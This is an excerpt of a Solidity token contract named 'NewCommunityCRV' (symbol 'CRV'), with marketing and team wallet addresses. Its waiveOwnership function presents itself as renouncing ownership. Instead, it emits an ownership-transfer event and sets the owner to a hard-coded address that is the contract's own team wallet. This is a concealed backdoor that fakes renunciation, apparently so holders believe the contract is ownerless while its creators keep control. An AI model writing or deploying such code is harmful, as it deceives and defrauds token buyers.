...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x4F2e469C618a5DD6D53817ba6dB27dB15731C890));
        _owner = address(0x4F2e469C618a5DD6D53817ba6dB27dB15731C890);
    }
...
contract NewCommunityCRV is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NewCommunityCRV";
    string private _symbol = "CRV";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9B9b6b99A4367593e41EE54Cbe15feEA178879eb);
    address payable public teamWalletAddress = payable(0x4F2e469C618a5DD6D53817ba6dB27dB15731C890);
